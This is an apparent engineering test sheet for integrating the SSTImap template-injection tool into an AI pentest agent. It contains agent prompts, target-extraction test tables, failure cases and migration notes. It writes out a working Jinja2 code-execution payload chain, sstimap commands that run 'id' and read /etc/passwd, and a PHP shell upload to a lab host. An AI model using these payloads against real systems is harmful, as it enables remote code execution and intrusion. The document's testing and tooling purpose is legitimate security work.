# ssti — Tier A scenarios

Single test sheet for the `ssti` tool migration (Wave 3.4 — fourth tool of
Wave 3, web-app injection cluster; Wave 3.2 lfi-rfi and 3.3 ssrfmap were
reclassified as native Python servers, not CLI wrappers).

ssti wraps SSTImap (vladko312/SSTImap, 1.3.x line — the actively-maintained
successor to tplmap). It is a Python script (`/opt/sstimap/sstimap.py`)
exposed on PATH via a thin `/usr/local/bin/sstimap` shell wrapper installed
in the Dockerfile. Native CLI; the LLM constructs the full sstimap
invocation. Detects 15+ template engines across Python (Jinja2, Mako,
Tornado, Django, Cheetah3), PHP (Twig, Smarty, Latte), Java (Freemarker,
Velocity, Pebble), JavaScript (Nunjucks, Pug/Jade, Dust, EJS, Handlebars,
Marko, doT), and Ruby (ERB, Slim, Haml).

Sections:
1. Recommended HTB box for live verification (and the unfortunate truth)
2. Narrative scenarios (paste into opensploit)
3. Target-extraction adversarial cases (≥20 — total 24)
4. Failure-signature live-verify cases (≥3 — total 7)
5. Open questions
6. Hand-off

---

## 1. Recommended HTB box

**Honest answer**: there is no canonical, currently-rotated HTB lab box that
exposes a vulnerable SSTI surface in the same way that Validation is
canonical for sqlmap. SSTI bugs on HTB tend to come and go with retired
seasons.

The closest historical candidates:

| Box | Surface | Verdict |
|---|---|---|
| **HTB Doctor (10.10.10.209)** | Flask + Jinja2 SSTI on the post-creation form (`title` field rendered into a Jinja2 template) | BEST historical fit. Classic `{{7*7}}` → `49` confirmation; full `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}` chain. Box is retired — lab availability is inconsistent. |
| **HTB Bagel** (some seasons) | .NET / Razor SSTI surface reported in some season-3 lineups | Lab availability varies; verify before committing. |
| **HTB Forge** | 2nd-stage SSRF + Flask Jinja2 in admin panel | Auth-gated; SSTI is post-foothold. |
| **vulhub flask-jinja2-ssti / flask-debug-ssti** | Local docker-compose lab with deliberately-vulnerable Flask app | RECOMMENDED for migration verification. Reproducible, no HTB credit burn, no rotation risk. |
| **PortSwigger Web Security Academy SSTI labs** | Six or seven deliberately-vulnerable labs covering Python/PHP/Java engines | Excellent for variety (Jinja2, ERB, Twig, Freemarker covered). Free with a Burp Community account. |

**Recommendation for Wave 3.4 live verification**:

1. Smoke-test path-handling against `sstimap -V` and `sstimap --help` (the
   latter does NOT trigger the interactive menu; safe in a stdio container).
2. Run detection-only (`-u 'http://target/?name=*' --no-color`) against a
   deliberately-vulnerable docker-compose stack (e.g.,
   `vulhub/flask-jinja2-ssti` or a PortSwigger Academy lab proxied through
   the container's network). Validates the `-u` path end-to-end without
   requiring HTB lab availability.
3. Run code-execution (`-S 'id' -e jinja --no-color`) against the same lab
   to verify the exploitation path.
4. Cross-check failure classifications (cases F1-F7 below) against any
   reachable target — failure signatures don't depend on the target being
   vulnerable.

**Persistent test directory**: mount `/tmp/ssti-test:/session` (per
SKILL #14). Output files for `-U /session/<shell>.php` upload tests, and any
custom payload files, need to live there for tool_runner pickup.

Suggested `/session/canary.txt` for `-U` upload smoke test:

```
opensploit-canary-2026
```

---

## 2. Narrative scenarios (paste into opensploit)

### S1 — `sstimap -V` (smoke)

```
Engagement target: none — running sstimap -V through opensploit to confirm the kind:cli path is wired and the container is reachable. Report the version string.
```

**Watch:** First call ~3 s (container spawn + MCP handshake), exit 0, stdout
contains `SSTImap version 1.3.3.7` (or whatever the cloned image ships).
Confirms persistent container reuse on subsequent calls. Note: the flag is
**uppercase -V**, NOT `-v` (which is unrecognized).

### S2 — reject_flags trap (`-i` interactive mode)

```
Engagement target: 10.10.10.209 (HTB Doctor or Flask SSTI lab, authorized).
The post-creation form is at /home/post. Test SSTImap interactively against http://10.10.10.209/home/post — let me poke around the engines manually.
```

**Watch:** Plugin rejects with `status: error`, `rejected_flag: -i` (or
`--interactive`). Reason quoted from tool.yaml `reject_flags_reason`. Per
the new tool-runner prompt clause: agent reformulates with `-u` against the
URL and uses `-S` / `-X` / `-T` for non-interactive exploitation. The same
rejection should fire for `-s` / `--os-shell`, `-t` / `--tpl-shell`, `-x` /
`--eval-shell`, `--load-urls`, and `--load-forms`.

### S3 — Detection only (real SSTI lab, full engine sweep)

```
Engagement target: 10.10.10.209 (HTB Doctor lab, authorized).
The post-creation form has a `title` field rendered into a Jinja2 template at /home/post. Probe the title parameter for SSTI using sstimap. Mark the injection point with the default '*' marker. Detection only — do not execute commands. Save the full output to /session/ssti-doctor-detect.txt via shell redirection (the tool has no --output flag so the LLM must capture stdout via the run_cli envelope).
```

**Watch:** target=`10.10.10.209` extracted from `-u`. The LLM emits
`sstimap -u 'http://10.10.10.209/home/post' -m POST -d 'title=*&content=test' --no-color`.
sstimap iterates payloads across all 15+ engines, identifies Jinja2 via the
rendered technique (output contains `Jinja2` and `Template engine: Jinja2`).
Exit 0; classified as success. tool_runner captures stdout; raw_output
holds the full prose log.

### S4 — Code execution (after detection confirms)

```
Engagement target: 10.10.10.209 (HTB Doctor, authorized).
Detection identified Jinja2. Execute `id` on the target via the title parameter.
```

**Watch:** Agent emits
`sstimap -u 'http://10.10.10.209/home/post' -m POST -d 'title=*&content=test' -e jinja -S 'id' --no-color`.
target=`10.10.10.209`. sstimap re-fires the Jinja2 payload, runs `id`, and
prints the command output (e.g., `uid=33(www-data) gid=33(www-data)
groups=33(www-data)`). Classified as success. The `-e jinja` skips
re-detection and goes straight to exploitation — much faster than re-running
the matrix.

### S5 — POST body injection (login form variant)

```
Engagement target: 10.10.10.5 (Flask SSTI lab, authorized).
The /login endpoint reflects the username field in an error message rendered through Jinja2. Probe the username parameter via POST.
```

**Watch:** Agent emits
`sstimap -u 'http://10.10.10.5/login' -m POST -d 'username=*&password=test' --no-color`.
target=`10.10.10.5`. sstimap injects payloads into the `username` field of
the POST body. If the bug is genuine, output identifies Jinja2 and reports
the rendered technique succeeded.

### S6 — Specific engine + level boost

```
Engagement target: 10.10.10.7 (PHP/Twig SSTI lab, authorized).
The form at /search reflects the `q` parameter into a Twig template. Default level missed it last run — boost level to 3 and pin to twig only.
```

**Watch:** Agent emits
`sstimap -u 'http://10.10.10.7/search?q=*' -e twig -l 3 --no-color`.
target=`10.10.10.7`. sstimap restricts to Twig payloads at escaping level 3.
Higher levels run more variants per engine — slower but covers
sandbox-aware payloads.

### S7 — File upload via SSTI (post-RCE)

```
Engagement target: 10.10.10.209 (HTB Doctor, authorized).
RCE confirmed via Jinja2. Upload /session/shell.php to /tmp/shell.php on the target.
```

**Watch:** Agent emits
`sstimap -u 'http://10.10.10.209/home/post' -m POST -d 'title=*&content=test' -e jinja -U /session/shell.php /tmp/shell.php --no-color`.
target=`10.10.10.209`. **CRITICAL: -U takes TWO positional arguments
(LOCAL REMOTE)**, NOT a single colon-separated string like sqlmap's
`--file-write=local --file-dest=remote`. Plugin's value_flags listing
includes -U; the flag-walker should consume two args. tool_runner verifies
the upload by re-fetching the path or running `ls -la /tmp/shell.php` via
-S in a follow-up call.

### S8 — Failure: connection refused (TCP layer)

```
Engagement target: 127.0.0.1 (intentionally wrong target for TCP-layer error classification).
Run sstimap against http://127.0.0.1:1/?name=test — port 1 is unbound.
```

**Watch:** target=`127.0.0.1` extracted. sstimap's underlying requests
library raises `Failed to establish a new connection: ... Connection
refused`. Failure classified via signature. Exit code may be 0 or non-zero
(build-dependent) — tool_runner pattern-matches signal regardless.

### S9 — Failure: DNS resolution (DNS layer)

```
Engagement target: nonexistent-host.invalid.localdomain (deliberately invalid).
Run sstimap against http://nonexistent-host.invalid.localdomain/?name=test.
```

**Watch:** target=`nonexistent-host.invalid.localdomain` extracted. DNS
lookup fails; output contains `Could not resolve` or `Name or service not
known`. Failure classified.

### S10 — Failure: missing -u argument

```
Engagement target: none.
Run sstimap with -e jinja but no -u — verify the failure signature fires.
```

**Watch:** target=null. argparse rejects with `the following arguments are
required` or sstimap's own `URL is required`. Failure classified via the
"the following arguments are required" or "URL is required" signature.

---

## 3. Target-extraction adversarial cases (24 total, ≥20 spec)

The ssti `tool.yaml` declares THREE target_extraction rules (first match
wins):

1. `flag_value` for `-u` with `parse_as: url_host`
2. `flag_value` for `--url` with `parse_as: url_host`
3. `positional_match` regex `^(?:--url=|-u=)?(https?|ftp|ftps|file|gopher)://([^:/?#*]+)`,
   capture group 2, `parse_as: url_host` — safety net for `-u=URL` and
   `--url=URL` equals form

`reject_flags` covers bulk loaders (`--load-urls`, `--load-forms`) and the
six interactive variants (`-i`, `--interactive`, `-s`, `--os-shell`, `-t`,
`--tpl-shell`, `-x`, `--eval-shell`).

`value_flags` lists 40+ entries covering targeting, request, detection,
exploitation, and crawler flags — every short-flag collision (`-c` for
crawl, `-C` for cookie, `-X` for eval-code, `-m` for method, `-p` for
proxy) is enumerated to prevent the flag-walker from grabbing values as
positional targets.

### Happy-path cases — `-u` flag form

| #  | Command (binary `sstimap` omitted) | Expected target | Notes |
|----|---|---|---|
| 1  | `-u http://10.10.10.209/home/post --no-color` | `10.10.10.209` | Bog-standard probe, IPv4. |
| 2  | `-u 'http://10.10.10.209/home/post?title=*' --no-color` | `10.10.10.209` | Asterisk injection marker — host capture strips via `[^:/?#*]+`. |
| 3  | `--url http://target.local/login --no-color` | `target.local` | `--url` (space-separated) flag form. |
| 4  | `--url=http://target.local/login --no-color` | `target.local` | `--url=` (equals form) — covered by positional_match safety net. |
| 5  | `-u=http://target.local/login --no-color` | `target.local` | `-u=` short flag with equals. Uncommon but valid. |
| 6  | `-u 'https://api.target.com:8443/v2/render?q=*' -e twig --no-color` | `api.target.com` | HTTPS + port + query — port stripped from host capture. |
| 7  | `-u 'http://VICTIM.HTB/post' --no-color` | `VICTIM.HTB` | Uppercase preserved (TargetValidation lowercases downstream). |
| 8  | `-u 'http://10.10.10.5/login' -m POST -d 'user=admin&pass=*' --no-color` | `10.10.10.5` | POST body with asterisk in -d — only the URL host counts; -d is a value_flag. |
| 9  | `-u 'http://10.10.10.5/api' -C 'PHPSESSID=abc; user=admin' --no-color` | `10.10.10.5` | Cookie value contains `;` and `=` — value_flag consumes -C. |
| 10 | `-u 'http://10.10.10.5/api' -e jinja,twig,mako -l 3 --no-color` | `10.10.10.5` | Engine list (commas) + level — value_flags consume both. |
| 11 | `-u 'http://shop.target.tld/products?cat=*' -p http://127.0.0.1:8080 --no-color` | `shop.target.tld` | Proxy URL is on localhost; target is the `-u` host. |
| 12 | `-u 'http://10.10.10.5/api' -S 'cat /etc/passwd' --no-color` | `10.10.10.5` | -S (os-cmd) value contains `/` and spaces — value_flag consumes it. |
| 13 | `-u 'http://10.10.10.5/api' -X 'open("/etc/passwd").read()' --no-color` | `10.10.10.5` | -X (eval-code) value contains quotes and parens — value_flag consumes it. **NOTE**: -X is NOT method (sqlmap convention) — sstimap's -X is eval-code. |
| 14 | `-u 'http://10.10.10.5/api' -m PUT -d 'body=*' --no-color` | `10.10.10.5` | -m (method) — sstimap's method flag is short -m, NOT -X. |
| 15 | `-u 'ftp://files.target.local/dir' --no-color` | `files.target.local` | FTP scheme — covered by positional_match regex's scheme alternation. |
| 16 | `-u 'http://target.local' -d '*' --no-color` | `target.local` | URL with no path; injection marker as entire body. |
| 17 | `-a 'Mozilla/5.0' -u http://10.10.10.5/page?id=* --no-color` | `10.10.10.5` | Other flag values (UA contains `/`) before URL. |
| 18 | `-u 'http://10.10.10.5/page?id=*' -H 'X-Forwarded-For: 1.2.3.4' --no-color` | `10.10.10.5` | IP-looking header value MUST NOT be the target. |
| 19 | `-u 'http://10.10.10.5/page?id=*' -U /session/shell.php /tmp/x.php --no-color` | `10.10.10.5` | -U takes TWO positional args after the flag. value_flag must consume both. **Open Question 2**. |
| 20 | `-u 'http://admin:s3cr3t@10.10.10.5/page?id=*' --no-color` | `10.10.10.5` | URL with userinfo `user:pass@` — host comes after `@`. Pure regex `[^:/?#*]+` after `://` captures `admin` (the username). **Open Question 1** (same issue as sqlmap case 20). |

### Adversarial cases (DSL must reject, fall back, or warn)

| # | Command | Expected behaviour | Notes |
|---|---|---|---|
| F1 | `-V` | `target=null` | Version banner, no target needed. |
| F2 | `--help` | `target=null` | Top-level help. Safe in container — sstimap's --help does NOT launch the menu. |
| F3 | `--load-urls /session/urls.txt --no-color` | Plugin rejects via `reject_flags`. `rejected_flag=--load-urls`. Per new tool-runner prompt: reformulate with `-u` from context. | URL list inside file. |
| F4 | `--load-forms /session/forms.txt --no-color` | Plugin rejects (`--load-forms` in reject_flags). | Form descriptor list. |
| F5 | `-i --no-color` | Plugin rejects (`-i` / `--interactive` in reject_flags). | Interactive mode — blocks on stdin. |
| F6 | `-u 'http://10.10.10.5/' -s --no-color` | Plugin rejects (`-s` / `--os-shell` in reject_flags). | Interactive OS shell. |
| F7 | `-u 'http://10.10.10.5/' -t --no-color` | Plugin rejects (`-t` / `--tpl-shell` in reject_flags). | Interactive template-engine REPL. |
| F8 | `-u 'http://10.10.10.5/' -x --no-color` | Plugin rejects (`-x` / `--eval-shell` in reject_flags). | Interactive language-eval REPL. |
| F9 | `-u 'https://' --no-color` | `target=null` (malformed). DSL parse_error or null. sstimap fails naturally. | Defensive parsing. |
| F10 | `-u 'http://10.10.10.5/' -p 'http://outofscope.attacker.com:8080' --no-color` | `target=10.10.10.5` (the `-u` target, NOT the proxy). | **Security invariant**: scope = target of request, not proxy. Same as sqlmap F8. |
| F11 | `-u 'http://10.10.10.5/' -H 'Host: real.target.com' --no-color` | `target=10.10.10.5` (NOT real.target.com). | Same invariant as curl F5 / sqlmap F9: Host header is behaviour override, not authorization scope. |
| F12 | (empty command, no args) | `target=null` | sstimap exits with argparse error 'arguments required'. |
| F13 | `-c 3 -u http://10.10.10.5/ --no-color` | `target=10.10.10.5` (NOT `3` — `-c` is crawl-depth, not cookie!). | **Critical short-flag collision test** — value_flag must include `-c` so the depth value is consumed before extraction reaches the URL. |
| F14 | `-C 'sess=abc' -u http://10.10.10.5/ --no-color` | `target=10.10.10.5` (the URL, NOT `sess=abc`). | **Short-flag collision** — `-C` is cookie (uppercase), not certificate. value_flag must consume. |
| F15 | `-X 'os.system("id")' -u http://10.10.10.5/ --no-color` | `target=10.10.10.5` (the URL, NOT the eval-code). | **Short-flag collision** — `-X` is eval-code, not method. value_flag must consume. |
| F16 | `-m POST -u http://10.10.10.5/ --no-color` | `target=10.10.10.5` (NOT `POST`). | `-m` is method; value_flag consumes `POST`. |

### Concatenated short-flag cases (commandUsesFlag must catch)

| # | Command | Expected behaviour | Notes |
|---|---|---|---|
| F17 | `-iurl.txt --no-color` | Plugin rejects (`-i` matched via concatenated form). | After commandUsesFlag fix in cli_in_container — verifies short-flag concatenation detection. |
| F18 | `-tjinja2 --no-color` | Plugin rejects (`-t` matched). | Same. |
| F19 | `-sshell --no-color` | Plugin rejects (`-s` matched). | Same. |

### Help / introspection (target=null)

| #  | Command | Expected | Notes |
|----|---|---|---|
| H1 | `--help` | `target=null` | Top-level help. Does NOT trigger interactive menu (verified in source). |
| H2 | `-h` | `target=null` | Short alias. |
| H3 | `-V` | `target=null` | Version banner. **NOTE**: `-v` is unrecognized; uppercase only. |
| H4 | `--version` | `target=null` | Long form. |
| H5 | `--module list` | `target=null` | List payload modules. |

---

## 4. Failure-signature live-verify cases (7 total, ≥3 spec)

Verify against the ssti container (rebuild during Wave 9 batch with
mcp-common 0.3.0 and the new SSTImap clone).

| # | Layer | Test | failure_signature `signal` | Status |
|---|---|---|---|---|
| 1 | DNS | `-u 'http://nonexistent-host.invalid.localdomain/?name=*' --no-color` | `Could not resolve` OR `Name or service not known` | PENDING live verify |
| 2 | TCP | `-u 'http://127.0.0.1:1/?name=*' --no-color` | `Failed to establish a new connection` AND/OR `Connection refused` | PENDING live verify |
| 3 | HTTP/TLS | `-u 'https://expired.badssl.com/' --verify-ssl --no-color` | `SSL: CERTIFICATE_VERIFY_FAILED` | PENDING live verify (only fires with --verify-ssl on; default is off) |
| 4 | SSTI detection | `-u 'http://example.com/?name=*' --no-color` (against a non-vulnerable site) | `No SSTI detected` OR `no template injection found` | PENDING live verify |
| 5 | Argument | `-e jinja --no-color` (no -u) | `the following arguments are required` OR `URL is required` | PENDING live verify |
| 6 | Argument typo | `-u http://example.com/ --headers 'X: 1' --no-color` (`--headers` plural — should be `--header`) | `unrecognized arguments` | PENDING live verify |
| 7 | Filesystem | `-u 'http://target/?name=*' -e jinja -U /nonexistent/local.txt /tmp/x.txt --no-color` | `Could not read file` OR `No such file or directory` | PENDING live verify |

### Layer diversity (SKILL #11) — achieved

7 distinct verifiable layers:
1. **DNS** (case 1)
2. **TCP** (case 2)
3. **HTTP/TLS** (case 3 — protocol-specific, post-handshake)
4. **SSTI-detection** (case 4 — application-layer, false-negative path)
5. **Argument validation** (case 5 — argparse, pre-network)
6. **Argument spelling** (case 6 — different classifier from case 5)
7. **Filesystem** (case 7 — local-side I/O failure)

Plus encoded-but-not-yet-live: Python traceback signature for build/dep
mismatches; engine-mismatch signature when `-e` forces a wrong engine.

### Lessons recorded in `tool.yaml` gotchas

1. **--no-color is non-negotiable** — without it, ANSI escape codes pollute
   stdout and tool_runner's prose parsing degrades. Verified in source: the
   default colour formatter is enabled unless `--no-color` is passed.
2. **Interactive variants are scope-escape hatches** — `-i`, `-s`, `-t`,
   `-x` and their `--*-shell` long forms all block on stdin. Reject up
   front; the agent should switch to `-S` / `-X` / `-T` (single-arg,
   non-interactive) for exploitation.
3. **Short-flag collisions with sister tools** — sstimap's `-X` is
   eval-code (NOT method), `-c` is crawl-depth (NOT cookie), `-C` is cookie
   (NOT certificate), `-m` is method (NOT header), `-p` is proxy (NOT
   port), `-V` is version (NOT verbose). Documented in gotchas + value_flags.
4. **-U/--upload and -D/--download take TWO positional arguments**, NOT a
   colon-separated 'LOCAL:REMOTE' string. Different convention from
   sqlmap/metasploit.
5. **No --output / --output-dir** — sstimap prints to stdout only. Capture
   from the run_cli envelope; no per-run session file.
6. **No --timeout / --retries** — sstimap uses --delay (between requests)
   and --blind-delay (for time-based detection). Hard cap is the kind:cli
   max_runtime_seconds.
7. **--load-urls / --load-forms are bulk loaders** — they put the target
   set outside the command line where scope validation cannot reach.
   Rejected up front via reject_flags.

---

## 5. Open questions

1. **Userinfo URL (case 20)** — pure regex `[^:/?#*]+` after `://` captures
   `admin` (the username) instead of `10.10.10.5`. Same issue as sqlmap
   case 20. Recommended fix: regex
   `(?:[^@/?#]*@)?([^:/?#*]+)` with capture group adjusted. **Verify in
   plugin's DSL implementation** — if not handled, update both sqlmap and
   ssti's `target_extraction` regex consistently.

2. **Multi-arg flags (`-U LOCAL REMOTE`, `-D REMOTE LOCAL`,
   `-R HOST PORT`, `-L LEVEL CLEVEL`, `-B PORT`)** — argparse's `nargs=2`
   means sstimap consumes the next two positional args after the flag. The
   plugin's flag-walker MUST consume both args, not just one. If
   value_flags only consumes one arg by default, the second arg may leak
   as a positional target. **Open question for plugin maintainers**: does
   value_flags support a `nargs` field, or do we need a separate
   `multi_arg_flags` listing? Today's value_flags entries assume single
   arg. Worst case: rules in `target_extraction` still anchor on `-u` /
   `--url`, so the leak is bounded — but the multi-arg flags should be
   tested in cli_in_container unit tests.

3. **`-u=URL` and `--url=URL` (equals form, cases 4-5)** — flag_value
   rules in the plugin's DSL sometimes only handle `--flag VALUE`
   (space-separated) and not `--flag=VALUE`. The positional_match regex
   safety net handles it. Verify in plugin tests.

4. **Project maintenance status** — vladko312/SSTImap is moderately
   maintained (1.3.x line, last commits within months at time of writing).
   Newer template engines (e.g., LiquidJS variants, Astro/Svelte SSR) and
   exotic frameworks may not be covered. Mitigation: keep the legacy
   mcp-server.py (httpx-based detect/exploit/list_engines methods) as the
   fallback path; agent can opt into kind:mcp methods when CLI gaps appear.

5. **Alternative tools for SSTI gap-filling** —
   (a) `nuclei` has SSTI templates (e.g., `flask-jinja2-rce`,
       `twig-debug-rce`, `freemarker-template-injection`) — use as
       supplement when sstimap's engine matrix misses something;
   (b) `tplmap` (predecessor) is largely abandoned but covered some
       engines sstimap doesn't (e.g., older Pug versions) — not packaged;
   (c) Manual `curl` with canary payloads (`{{7*7}}` for Jinja2/Twig,
       `${7*7}` for Mako/Freemarker, `<%= 7*7 %>` for ERB, `${{7*7}}` for
       Smarty) is often faster for triage before committing to sstimap's
       full sweep.
   Document in `routing.never_use_for` once we've measured failure modes
   in live use.

6. **No HTB lab box for canonical live verification** — Validation HTB box
   was canonical for sqlmap; HTB Doctor was the closest for sstimap but is
   retired. Recommendation: build a small `vulhub`-style docker-compose lab
   (Flask + Jinja2 with intentional SSTI on /home/post) and ship it as
   `lab/ssti-test/` for repeatable Wave 9 verification.

7. **SSTImap binary path** — installed via `git clone` (NOT apt; vladko312
   isn't packaged in Kali). Wrapper at `/usr/local/bin/sstimap` execs
   `/opt/sstimap/sstimap.py`. Verify the wrapper survives image rebuilds:
   the Dockerfile uses a heredoc-style printf to install it; if the printf
   is mangled, sstimap won't be on PATH and the kind:cli call will fail
   with "binary not found". Alternative: `chmod +x /opt/sstimap/sstimap.py
   && ln -s /opt/sstimap/sstimap.py /usr/local/bin/sstimap` — symlink form
   is shorter but loses the exec wrapper indirection (which could be
   useful for environment scrubbing later).

8. **Output capture** — sstimap has no native output file flag. The agent
   relies on `run_cli`'s stdout capture, which is bounded by the MCP
   transport's response size limit. Long detection runs (level 5, all
   engines, time-based blind on a slow target) can produce hundreds of KB
   of prose. If hit, fall back to `-r R` (rendered only) + `-e <engine>`
   to scope the run; or break into multiple smaller calls.

9. **`-m` short flag for method** — sstimap's `-m` is method (NOT header).
   curl uses `-X` for method; sqlmap uses `--method`; sstimap diverges. The
   agent must internalize the per-tool convention. Documented in gotchas;
   value_flags includes both `-m` and `--method`.

10. **`--log-response` log destination** — writes to `~/.sstimap/sstimap.log`
    inside the container. NOT exposed back to the host. If the agent
    enables this flag, the log is lost when the container is recycled.
    Either skip the flag (default) or shell-redirect stdout via the
    plugin's tooling. Capacity for `--log-response` to write under
    `/session/` would require an upstream patch.

11. **Lost classifier — `_parse_detection_output`** — the legacy
    mcp-server.py parsed sstimap's prose into a structured dict
    (`vulnerable`, `engine`, `language`, `os_shell`, `eval_shell`,
    `tpl_shell`, `technique`) by regex-matching lines like
    `confirmed injection`, `Engine: X`, `OS command execution`. Under
    kind:cli the LLM reads raw stdout and must reconstruct these fields
    itself. Specifically watch for: (a) the `Confirmed injection` /
    `<Engine> identified` lines for the `vulnerable=true` flag;
    (b) `Engine: <Name>` for engine identification; (c) `OS command
    execution: yes` and `Code evaluation: yes` for capability hints —
    these tell the agent which exploitation flag to pick (`-S` vs `-X`
    vs `-T`); (d) `Rendered` / `Error-based` / `Time-based blind` /
    `Boolean-based blind` for technique attribution. Worth surfacing as
    a structured prompt in the Master Pentest agent's post-detection
    summary stage.

12. **Lost command-output extractor — exploit()** — the legacy
    mcp-server.py walked sstimap's stdout for lines that don't start
    with `[` (status prefix) or four spaces (continuation), capturing
    them as the command's actual stdout (lines 313-323). With kind:cli
    the LLM must find `id` / `whoami` / `cat` output in raw_output. The
    heuristic is brittle even in legacy code; better path post-migration
    is to (a) use `-S` for one-shot OS exec (sstimap prints output
    after a `Response:` marker in 1.3.x), and (b) when uncertain, follow
    up with a second `-S 'echo OPENSPLOIT_MARKER_<rand>; <real cmd>;
    echo END_MARKER'` so the LLM can grep the output between sentinels.
    Document as a usage_pattern if the marker idiom proves reliable in
    Wave 9 verification.

---

## 6. Hand-off

- **Tool**: ssti (kind:cli, vladko312/SSTImap 1.3.3.7 — Python 3 — installed
  via git clone). Wrapper at `/usr/local/bin/sstimap` execs
  `/opt/sstimap/sstimap.py`.
- **Status**: tool.yaml authored end-to-end; scenarios.md written.
  **Dockerfile EDITED** — `python3 / python3-pip / python3-venv` replaced
  with `python3-full` (Kali-rolling-friendly per nikto / impacket / ffuf /
  nuclei convention). Added the `/usr/local/bin/sstimap` wrapper so
  `binary: sstimap` resolves on PATH. Pinned the SSTImap requirements
  (requests, urllib3, mechanize, html5lib) to system Python via
  `--break-system-packages`; mcp-common stays in the venv.
- **mcp-server.py UNTOUCHED** — auto-inherits `run_cli` from BaseMCPServer
  (mcp-common 0.3.0); existing per-method handlers (`detect`, `exploit`,
  `list_engines`) preserved as the legacy / rollback path per SKILL #21.
  Especially valuable for ssti because the project is moderately
  maintained — if upstream stalls or breaks, the legacy detect/exploit
  paths still work via direct python3 invocation.
- **Image**: `ghcr.io/silicon-works/mcp-tools-ssti:latest` — needs rebuild
  during Wave 9 batch to pick up mcp-common 0.3.0 AND the new wrapper.
  Image size will grow modestly (~20 MB) for the wrapper + git history.
  Updated `image_size_mb: 320` in tool.yaml (was 300).
- **target_extraction = THREE rules**: `flag_value` for `-u` (url_host),
  `flag_value` for `--url` (url_host), `positional_match` regex for
  `-u=` / `--url=` equals form. Same shape as sqlmap.
- **value_flags**: 40+ entries covering targeting, request, detection,
  exploitation, crawler, and noise control. Every short-flag collision
  with sqlmap/curl conventions (`-X`, `-c`, `-C`, `-m`, `-p`, `-V`) is
  enumerated.
- **reject_flags**: `--load-urls`, `--load-forms` (bulk loaders), plus six
  interactive variants (`-i`, `--interactive`, `-s`, `--os-shell`, `-t`,
  `--tpl-shell`, `-x`, `--eval-shell`). The interactive variants are NOT
  scope-escapes per se — they're container-incompatible. Rejecting them
  up front saves a 5-min idle_timeout wait.
- **Wave 3.4**: fourth tool of Wave 3 (web-app injection cluster). Tier A
  migration progress: 13 tools done after this (curl, sqlmap, impacket,
  nmap, ffuf, nuclei, nikto, john, hashcat, kerbrute, hydra,
  ssti). 3.2 (lfi-rfi) and 3.3 (ssrfmap) reclassified as native Python
  servers — not on the kind:cli path.
- **Live-verify pending**: paste S1-S10 against a Flask/Jinja2 SSTI lab
  during Wave 9 batch rebuild + e2e run. Verify failure signatures 1-7
  live; verify target-extraction cases F1-F19 with plugin unit tests.
- **Files removed**: NONE — the directory was already on the simpler
  layout (no `target_extraction_tests.md`, no `failure_signature_tests.md`,
  no `__pycache__/`).

Authored: 2026-04-25.
